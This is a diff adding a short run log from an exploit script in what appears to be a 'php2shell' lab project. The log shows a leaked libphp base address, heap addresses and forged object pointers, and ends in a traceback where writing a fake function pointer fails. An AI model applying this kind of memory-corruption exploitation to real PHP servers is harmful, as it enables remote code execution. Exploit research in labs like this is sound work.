@@ -1,0 +1,13 @@
+=== oom114: names-walk + values-fields ===
+libphp base: 0x7f1b44408000
+names-m: (200) Fatal=False len=43
+names copies: ['0x7f1b42656328', '0x7f1b42656360', '0x7f1b42656398', '0x7f1b426563d0', '0x7f1b42656408', '0x7f1b42656440', '0x7f1b42656478', '0x7f1b426564b0']
+fat-m: Fatal=True
+values copies: ['0x7f1b41e01718', '0x7f1b41e02518', '0x7f1b41e03318', '0x7f1b41e04118', '0x7f1b41e04f18', '0x7f1b41e05d18']
+FV=0x7f1b41e01718
+OBJ=0x7f1b41e01b18
+Traceback (most recent call last):
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom114.py", line 183, in <module>
+    struct.pack_into("<Q", T, 0x600 + 8, BASE + ZIF)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+struct.error: pack_into requires a buffer of at least 1552 bytes for packing 8 bytes at offset 1544 (actual buffer size is 1537)
